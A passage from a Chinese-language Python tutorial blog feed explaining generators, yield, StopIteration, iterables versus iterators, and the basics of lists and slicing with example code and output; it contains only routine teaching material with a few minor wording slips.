<li><p>一个函数正常执行遇到yeild时，<font color="#FF7F00"><strong>yeild返回一个值给函数的调用者，然后在这暂停并记住这个位置</strong></font>（因为此时程序要跳转到调用这个函数的地方 &#x3D;&gt; 因为yeild的返回）<font color="#FF7F00"><strong>！不去执行下一个语句的代码。当程序执行遇到__next__()方法或者next()（Python2用）时，继续执行上次yield的下一个语句直到遇到下一个yield或者该函数结束。</strong></font></p>
</li>
<li><p>send()和next()的区别就在于send可传递参数给yield表达式，这时候传递的参数就会作为yield表达式的值，而yield的参数是返回给调用者的值，也就是说send可以强行修改上一个yield表达式值。</p>
</li>
<li><p>send()和next()都有返回值，他们的返回值是当前迭代遇到的yield的时候，yield后面表达式的值，其实就是当前迭代yield后面的参数。</p>
</li>
<li><p><font color="#FF7F00"><strong>for…in 循环中会自动调用 next()</strong></font>。这就说明for…in能够不中断地执行完整个函数。</p>
</li>
</ol>
<br>

<p>下面举例子说明：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">下面的例子用 a.__next__() 和 <span class="built_in">print</span>(<span class="built_in">next</span>(a)) 来说明yeild的返回和暂停</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">例<span class="number">1</span>：</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">odd</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;step 1&#x27;</span>)</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;step 2&#x27;</span>)</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">3</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;step 3&#x27;</span>)</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">5</span></span><br><span class="line"></span><br><span class="line">a = odd()</span><br><span class="line">b = a.__next__()  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;*****分割线*****&#x27;</span>)  </span><br><span class="line"><span class="built_in">print</span>(b) </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">c = a.__next__() </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;*****分割线*****&#x27;</span>)  </span><br><span class="line"><span class="built_in">print</span>(c) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输出：       </span><br><span class="line">step <span class="number">1</span></span><br><span class="line">*****分割线*****</span><br><span class="line"><span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">step <span class="number">2</span></span><br><span class="line">*****分割线*****</span><br><span class="line"><span class="number">3</span></span><br><span class="line"></span><br><span class="line">结论：这个时候在<span class="keyword">yield</span> <span class="number">1</span>处暂停了（输出step1），并且<span class="keyword">yield</span>返回了一个值<span class="number">1</span>给a.__next__() 。</span><br></pre></td></tr></table></figure>


<br>

<br>

<h4 id="2-2-表达式创建生成器"><a href="#2-2-表达式创建生成器" class="headerlink" title="2.2 表达式创建生成器"></a><font color="#3CB371" face="Comic sans MS">2.2 表达式创建生成器</font></h4><blockquote>
<p><font color="#FF7F00"><strong>generator保存的是算法，每次调用next(generaotr_ex)就计算出他的下一个元素的值，直到计算出最后一个元素，没有更多的元素时，抛出StopIteration的错误。</strong></font></p>
</blockquote>
<p>要创建一个generator，有很多种方法，第一种方法很简单，只有<font color="#FF7F00"><strong>把一个列表生成式的[]中括号改为（）小括号</strong></font>，就创建一个generator:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#列表生成式</span></span><br><span class="line">lis = [x*x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br><span class="line"><span class="built_in">print</span>(lis)</span><br><span class="line"><span class="comment">#生成器</span></span><br><span class="line">generator_ex = (x*x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>))</span><br><span class="line"><span class="built_in">print</span>(generator_ex)</span><br><span class="line"> </span><br><span class="line">结果：</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">64</span>, <span class="number">81</span>]</span><br><span class="line">&lt;generator <span class="built_in">object</span> &lt;genexpr&gt; at <span class="number">0x000002A4CBF9EBA0</span>&gt;</span><br></pre></td></tr></table></figure>

<br>

<p>　　那么创建lis和generator_ex，的区别是什么呢？从表面看就是[  ]和（）,但是结果却不一样，一个打印出来是列表（因为是列表生成式），而第二个打印出来却是&lt;generator object <genexpr> at 0x000002A4CBF9EBA0&gt;，那么如何打印出来generator_ex的每一个元素呢？</p>
<p>　　如果要一个个打印出来，可以通过 <code>__next__()</code> 获得generator的下一个返回值：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#生成器</span></span><br><span class="line">generator_ex = (x*x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>))</span><br><span class="line"><span class="built_in">print</span>(generator_ex.__next__())</span><br><span class="line"><span class="built_in">print</span>(generator_ex.__next__())</span><br><span class="line"><span class="built_in">print</span>(generator_ex.__next__())</span><br><span class="line"><span class="built_in">print</span>(generator_ex.__next__())</span><br><span class="line"><span class="built_in">print</span>(generator_ex.__next__())</span><br><span class="line"><span class="built_in">print</span>(generator_ex.__next__())</span><br><span class="line"><span class="built_in">print</span>(generator_ex.__next__())</span><br><span class="line"><span class="built_in">print</span>(generator_ex.__next__())</span><br><span class="line"><span class="built_in">print</span>(generator_ex.__next__())</span><br><span class="line"><span class="built_in">print</span>(generator_ex.__next__())</span><br><span class="line"><span class="built_in">print</span>(generator_ex.__next__())</span><br><span class="line"></span><br><span class="line">结果：</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="number">16</span></span><br><span class="line"><span class="number">25</span></span><br><span class="line"><span class="number">36</span></span><br><span class="line"><span class="number">49</span></span><br><span class="line"><span class="number">64</span></span><br><span class="line"><span class="number">81</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;列表生成式.py&quot;</span>, line <span class="number">42</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">next</span>(generator_ex))</span><br><span class="line">StopIteration</span><br></pre></td></tr></table></figure>

<br>

<p><strong>generator保存的是算法，每次调用next(generaotr_ex)就计算出他的下一个元素的值，直到计算出最后一个元素，没有更多的元素时，抛出StopIteration的错误</strong>，而且上面这样不断调用是一个不好的习惯，正确的方法是使用for循环，因为generator也是可迭代对象。</p>
<p>所以我们创建一个generator后，基本上永远不会调用<code>__next__()</code>，而是通过for循环来迭代，并且不需要关心StopIteration的错误，generator非常强大，如果推算的算法比较复杂，用类似列表生成式的for循环无法实现的时候，还可以用函数来实现。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#生成器</span></span><br><span class="line">generator_ex = (x*x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> generator_ex:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">     </span><br><span class="line">结果：</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="number">16</span></span><br><span class="line"><span class="number">25</span></span><br><span class="line"><span class="number">36</span></span><br><span class="line"><span class="number">49</span></span><br><span class="line"><span class="number">64</span></span><br><span class="line"><span class="number">81</span></span><br></pre></td></tr></table></figure>


<br>

<br>

<h4 id="2-2-函数创建生成器"><a href="#2-2-函数创建生成器" class="headerlink" title="2.2 函数创建生成器"></a><font color="#3CB371" face="Comic sans MS">2.2 函数创建生成器</font></h4><blockquote>
<p><font color="#FF7F00"><strong>如果一个函数定义中包含yield关键字，那么这个函数就不再是一个普通函数，而是一个生成器。</strong></font></p>
</blockquote>
<br>

<p>下面举例子说明：</p>
<p>著名的斐波那契数列，除第一个和第二个数外，任何一个数都可以由前两个相加得到：</p>
<p>1，1，2，3，5，8，13，21，34…..</p>
<p>斐波那契数列用列表生成式写不出来，但是，用函数把它打印出来却很容易：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#fibonacci数列</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params"><span class="built_in">max</span></span>):</span></span><br><span class="line">    n,a,b =<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> n &lt; <span class="built_in">max</span>:</span><br><span class="line">        a,b =b,a+b</span><br><span class="line">        n = n+<span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(a)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;done&#x27;</span></span><br><span class="line"> </span><br><span class="line">a = fib(<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(fib(<span class="number">6</span>))</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">8</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">8</span></span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<blockquote>
<p>a,b &#x3D; b ,a+b  其实相当于 t &#x3D;a+b ,a &#x3D;b ,b &#x3D;t  ，所以不必写显示写出临时变量t，就可以输出斐波那契数列的前N个数字。</p>
</blockquote>
<br>

<p>上面我们发现，print(b)每次函数运行都要打印，占内存，所以为了不占内存，我们也可以使用生成器，同样是使用函数，只不过函数中有 <code>yield</code> 语句，所以叫做生成器。但是返回的不再是一个值，而是一个生成器，和上面的例子一样。</p>
<p>那么这样就不占内存了，这里说一下generator和函数的执行流程，函数是顺序执行的，遇到return语句或者最后一行函数语句就返回。而变成generator的函数，在每次调用__next__()方法的时候执行，遇到yield语句返回，再次被__next__() 调用时候从上次的返回yield语句处继续执行，也就是用多少，取多少，不占内存。如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params"><span class="built_in">max</span></span>):</span></span><br><span class="line">    n,a,b =<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> n &lt; <span class="built_in">max</span>:</span><br><span class="line">        <span class="keyword">yield</span> b</span><br><span class="line">        a,b =b,a+b</span><br><span class="line">        n = n+<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;done&#x27;</span></span><br><span class="line"> </span><br><span class="line">a = fib(<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(fib(<span class="number">6</span>))</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">&lt;generator <span class="built_in">object</span> fib at <span class="number">0x000001C03AC34FC0</span>&gt;</span><br></pre></td></tr></table></figure>



<br>

<p>下面用3个例子说明用for…in 循环的好处，但是拿不到return 语句的返回值，那么就会报错，所以为了不让报错，就要进行异常处理，拿到返回值，如果想要拿到返回值，必须捕获StopIteration错误，而返回值包含在StopIteration的value中。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> 使用__next__()方法到最后一个的下一个时会报错。</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params"><span class="built_in">max</span></span>):</span></span><br><span class="line">    n,a,b =<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> n &lt; <span class="built_in">max</span>:</span><br><span class="line">        <span class="keyword">yield</span> b</span><br><span class="line">        a,b =b,a+b</span><br><span class="line">        n = n+<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;done&#x27;</span></span><br><span class="line"> </span><br><span class="line">a = fib(<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(fib(<span class="number">6</span>))</span><br><span class="line"><span class="built_in">print</span>(a.__next__())</span><br><span class="line"><span class="built_in">print</span>(a.__next__())</span><br><span class="line"><span class="built_in">print</span>(a.__next__())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;可以顺便干其他事情&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(a.__next__())</span><br><span class="line"><span class="built_in">print</span>(a.__next__())</span><br><span class="line"><span class="built_in">print</span>(a.__next__())</span><br><span class="line"><span class="built_in">print</span>(a.__next__())</span><br><span class="line"> </span><br><span class="line">结果：</span><br><span class="line">&lt;generator <span class="built_in">object</span> fib at <span class="number">0x01058B70</span>&gt;</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line">可以顺便干其他事情</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">8</span></span><br><span class="line">Traceback (most recent call last):       //看到报错，并且 StopIteration: done</span><br><span class="line">  File <span class="string">&quot;3.py&quot;</span>, line <span class="number">18</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="built_in">print</span>(a.__next__())</span><br><span class="line">StopIteration: done</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> 在上面fib的例子，我们在循环过程中不断调用<span class="keyword">yield</span>，就会不断中断。当然要给循环设置一个条件来退出循环，</span><br><span class="line">   不然就会产生一个无限数列出来。把函数改成generator后，我们基本上从来不会用<span class="built_in">next</span>()来获取下一个</span><br><span class="line">   返回值，而是直接使用<span class="keyword">for</span>循环来迭代，但是拿不到<span class="keyword">return</span> 语句的返回值：</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params"><span class="built_in">max</span></span>):</span></span><br><span class="line">    n,a,b =<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> n &lt; <span class="built_in">max</span>:</span><br><span class="line">        <span class="keyword">yield</span> b</span><br><span class="line">        a,b =b,a+b</span><br><span class="line">        n = n+<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;done&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> fib(<span class="number">6</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">     </span><br><span class="line">结果：</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">8</span>             //程序没报错，但是拿不到<span class="keyword">return</span>返回的值。</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> 如果想要拿到返回值，必须捕获StopIteration错误，返回值包含在StopIteration的value中：</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params"><span class="built_in">max</span></span>):</span></span><br><span class="line">    n,a,b =<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> n &lt; <span class="built_in">max</span>:</span><br><span class="line">        <span class="keyword">yield</span> b</span><br><span class="line">        a,b =b,a+b</span><br><span class="line">        n = n+<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;done&#x27;</span></span><br><span class="line">g = fib(<span class="number">6</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        x = <span class="built_in">next</span>(g)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;generator: &#x27;</span>,x)</span><br><span class="line">    <span class="keyword">except</span> StopIteration <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;生成器返回值：&quot;</span>,e.value)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">结果：</span><br><span class="line">generator:  <span class="number">1</span></span><br><span class="line">generator:  <span class="number">1</span></span><br><span class="line">generator:  <span class="number">2</span></span><br><span class="line">generator:  <span class="number">3</span></span><br><span class="line">generator:  <span class="number">5</span></span><br><span class="line">generator:  <span class="number">8</span></span><br><span class="line">生成器返回值： done      //拿到了<span class="keyword">return</span>的返回值！</span><br></pre></td></tr></table></figure>



<br>

<br>

<h3 id="三-迭代器"><a href="#三-迭代器" class="headerlink" title="三. 迭代器"></a><font color="#FF6347" face="Comic sans MS">三. 迭代器</font></h3><blockquote>
<p><font color="#FF7F00"><strong>迭代就是循环，迭代器功能是把一个可迭代的对象转换为生成器。因为生成器本身就是可迭代的。</strong></font><br>迭代器包含有next方法的实现，在正确的范围内返回期待的数据以及超出范围后能够抛出StopIteration的错误停止迭代。</p>
</blockquote>
<br>

<blockquote>
<p><font color="#00B2EE"><strong>可以直接作用于for循环的数据类型有以下几种：</strong></font><br><font color="#FF7F00"><strong>一类是集合数据类型：</strong></font>如list,tuple,dict,set,str等；<br><font color="#FF7F00"><strong>一类是generator：</strong></font>包括生成器和带yield的generator 函数。</p>
</blockquote>
<br>

<br>

<h4 id="3-1-可迭代对象"><a href="#3-1-可迭代对象" class="headerlink" title="3.1 可迭代对象"></a><font color="#3CB371" face="Comic sans MS">3.1 可迭代对象</font></h4><p>这些可以直接作用于for 循环的对象统称为<font color="#00B2EE"><strong>可迭代对象：Iterable</strong></font><br>可以使用 <strong><code>isinstance()</code></strong> 判断一个对象是否为可Iterable对象！</p>
<p>查阅：<font color="#00B2EE">[<a href="http://www.runoob.com/python/python-func-isinstance.html">Python isinstance() 函数</a>]</font></p>
<br>

<p><strong>语法</strong></p>
<p><code>isinstance(object, classinfo)</code></p>
<p><strong>参数</strong><br>object – 实例对象。<br>classinfo – 可以是直接或间接类名、基本类型或者由它们组成的元组。</p>
<p><strong>返回值</strong><br>如果两个参数类型（classinfo）相同则返回 True，否则返回 False。</p>
<br>

<br>

<h4 id="3-2-迭代器"><a href="#3-2-迭代器" class="headerlink" title="3.2 迭代器"></a><font color="#3CB371" face="Comic sans MS">3.2 迭代器</font></h4><p>一个实现了iter方法的对象时可迭代的，一个实现next方法的对象是迭代器<br>可以被next()函数调用并不断返回下一个值的对象称为<font color="#00B2EE"><strong>迭代器：Iterator</strong></font>。<br>可以使用isinstance()判断一个对象是否是Iterator对象</p>
<p>所以，整体的流程为：</p>
<ol>
<li><p>使用isinstance()判断一个对象是否为Iterable对象（可迭代对象），语法为<code>isinstance(对象,Iterable)</code>。返回Ture&#x2F;False。</p>
</li>
<li><p>如果返回 Ture，使用 <code>iter(可迭代对象)</code> 即可得到返回值为生成器的东西。</p>
</li>
<li><p>然后就可以把这个返回值作为生成器去尽情的使用了。</p>
</li>
</ol>
<br>

<p>查阅：<font color="#00B2EE">[<a href="http://www.runoob.com/python/python-func-iter.html">Python iter() 函数</a>]</font></p>
<blockquote>
<p><font color="#FF7F00"><strong>总结：</strong></font></p>
</blockquote>
<ol>
<li>凡是可作用于for循环的对象都是Iterable类型；</li>
<li>凡是可作用于next()函数的对象都是Iterator类型，它们表示一个惰性计算的序列；<br>集合数据类型如list、dict、str等是Iterable但不是Iterator，不过可以通过iter()函数获得一个Iterator对象。</li>
<li>生成器都是Iterator对象，但list、dict、str虽然是Iterable（可迭代对象），却不是Iterator（迭代器）。</li>
<li>iter()返回值是迭代器对象。</li>
</ol>
<br>

<p>举例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections.abc <span class="keyword">import</span> Iterable,Iterator</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">isinstance</span>(<span class="string">&#x27;abc&#x27;</span>, Iterable))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">isinstance</span>([], Iterable))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">isinstance</span>(&#123;&#125;, Iterable))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">isinstance</span>((x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)), Iterable))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">isinstance</span>(<span class="number">100</span>, Iterable))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">isinstance</span>((x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)), Iterator))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">isinstance</span>([], Iterator))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">isinstance</span>(&#123;&#125;, Iterator))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">isinstance</span>(<span class="string">&#x27;abc&#x27;</span>, Iterator))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">isinstance</span>(<span class="built_in">iter</span>([]), Iterator))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">isinstance</span>(<span class="built_in">iter</span>(<span class="string">&#x27;abc&#x27;</span>), Iterator))</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-列表、元组、字典、集合</title>
    <url>/post/Python-list-tuple-dict-set/</url>
    <content><![CDATA[<p>Python的列表相当于数组 ( ⸝⸝•ᴗ•⸝⸝ )੭⁾⁾</p>
<span id="more"></span>


<br>

<br>


<center><font color="#00B2EE" face="Comic sans MS" size=5>Python 列表、元组、字典、集合</font> </center>


<br>

<br>

<h3 id="一-认识列表"><a href="#一-认识列表" class="headerlink" title="一. 认识列表"></a><font color="#FF6347" face="Comic sans MS">一. 认识列表</font></h3><br>

<blockquote>
<p><font color="#00B2EE" face="Comic sans MS"><strong>列表（list）是什么：</strong></font></p>
</blockquote>
<ol>
<li>序列是Python中最基本的数据结构。</li>
<li>在Python中，用方括号 [ ] 来表示列表，并用逗号来分隔其中的元素。并且<font color="#FF7F00"><strong>列表的数据项（各个元素）不需要具有相同的类型</strong></font>。</li>
<li>序列中的每个元素都分配一个数字 - 它的位置，即索引，<font color="#FF7F00"><strong>第一个索引是0，第二个索引是1，依此类推</strong></font>。</li>
<li>序列都可以进行的操作包括索引，切片，加，乘，检查成员。</li>
<li>此外，Python已经内置确定序列的长度以及确定最大和最小的元素的方法。</li>
<li>把列表当作堆栈使用。涉及的方法有：append()、pop()</li>
<li>访问和使用列表可以使用切片。[a:b]</li>
<li>把列表当作队列使用（不过使用起来较麻烦，可自行百度）。</li>
<li>列表可以<font color="#FF7F00"><strong>嵌套使用</strong></font>。</li>
<li>列表复制是这样的：<code>list2 = list1[:]</code></li>
<li>获取列表的索引值：<code>a = list.index(&quot;String&quot;)</code></li>
</ol>
<br>

<p>定义列表的示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 = [<span class="string">&#x27;physics&#x27;</span>, <span class="string">&#x27;chemistry&#x27;</span>, <span class="number">1997</span>, <span class="number">2000</span>]</span><br><span class="line">list2 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> ]</span><br><span class="line">list3 = [<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(list1)</span><br><span class="line"><span class="built_in">print</span>(list2)</span><br><span class="line"><span class="built_in">print</span>(list3)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">[<span class="string">&#x27;physics&#x27;</span>, <span class="string">&#x27;chemistry&#x27;</span>, <span class="number">1997</span>, <span class="number">2000</span>] </span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>] </span><br><span class="line">[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>] </span><br></pre></td></tr></table></figure>

<br>

<br>

<h3 id="二-切片"><a href="#二-切片" class="headerlink" title="二. 切片"></a><font color="#FF6347" face="Comic sans MS">二. 切片</font></h3><blockquote>
<p><font color="#00B2EE" face="Comic sans MS"><strong>切片和索引：</strong></font></p>
</blockquote>
<ol>
<li>与字符串的索引一样，列表索引从0开始。(在字符串那个章节总结过)列表可以进行截取、组合等；</li>
<li>你还可以处理列表的部分元素——Python称之为切片。使用下标索引来访问列表中的值，同样你也可以使用方括号[ ]的形式截取字符； [x:y]</li>
<li>要创建切片，可指定要使用的第一个元素和最后一个元素的索引。与函数range() 一样，Python在<font color="#FF7F00"><strong>到达你指定的第二个索引前面的元素后停止</strong></font>。要输出列表中的前三个元素，需要指定索引<code>0~3</code>，这将输出分别为0 、1 和2 的元素； [1:5]表示索引为1,2,3,4的四个元素</li>
<li>如果你没有指定第一个索引，Python将自动从列表开头开始； [ :6]</li>
<li>要让切片终止于列表末尾，也可使用类似的语法，即不指定第二个索引； [2: ]<br>无论列表多长，这种语法都能够让你输出从特定位置到列表末尾的所有元素。</li>
<li>如果要遍历列表的部分元素，可在for 循环中使用切片。</li>
</ol>
<br>

<p>下面示例代码（注意“&#x2F;&#x2F;”不代表注释，仅仅为了展示）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 = [<span class="string">&#x27;physics&#x27;</span>, <span class="string">&#x27;chemistry&#x27;</span>, <span class="number">1997</span>, <span class="number">2000</span>]</span><br><span class="line">list2 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span> ]</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(list1[<span class="number">1</span>],list1[-<span class="number">2</span>])           //类似字符串一样使用索引</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;list1[0]: &quot;</span>, list1[<span class="number">0</span>])      //输出第一个元素</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;list2[1:5]: &quot;</span>, list2[<span class="number">1</span>:<span class="number">5</span>])  //输出索引为<span class="number">1</span>到（<span class="number">5</span>-<span class="number">1</span>）的元素</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;list2[:4]: &quot;</span>, list2[<span class="number">1</span>:])    //前者输出从第<span class="number">1</span>个元素到索引为（<span class="number">4</span>-<span class="number">1</span>）的元素</span><br><span class="line">                                    //后者输出索引为<span class="number">1</span>到最后一个元素</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">chemistry <span class="number">1997</span> </span><br><span class="line">list1[<span class="number">0</span>]:  physics </span><br><span class="line">list2[<span class="number">1</span>:<span class="number">5</span>]:  [<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>] </span><br><span class="line">list2[:<span class="number">4</span>]:  [<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>] </span><br></pre></td></tr></table></figure>


<br>

<br>

<h3 id="三-更新列表"><a href="#三-更新列表" class="headerlink" title="三. 更新列表"></a><font color="#FF6347" face="Comic sans MS">三. 更新列表</font></h3><h4 id="3-1-处理元素"><a href="#3-1-处理元素" class="headerlink" title="3.1 处理元素"></a><font color="#3CB371" face="Comic sans MS">3.1 处理元素</font></h4><p>附加参考：<font color="#00B2EE">[<a href="https://www.cnblogs.com/wl404/p/7884665.html">列表使用大全</a>]</font> <font color="#00B2EE">[<a href="https://blog.csdn.net/viviliao_/article/details/79518219">Python3列表元素的修改</a>]</font> </p>
<blockquote>
<p><font color="#00B2EE" face="Comic sans MS"><strong>1. 按索引来使用的方法</strong></font></p>
</blockquote>
<ol>
<li><font color="#FF7F00">append(‘String’)：</font> 将元素string追加到列表末尾，即把一个元素添加到堆栈顶；</li>
<li><font color="#FF7F00">pop(X)：</font> 删除列表中任何位置的元素，只需在括号中指定要删除的元素的索引即可。若果不指定则默认删除末尾的元素；</li>
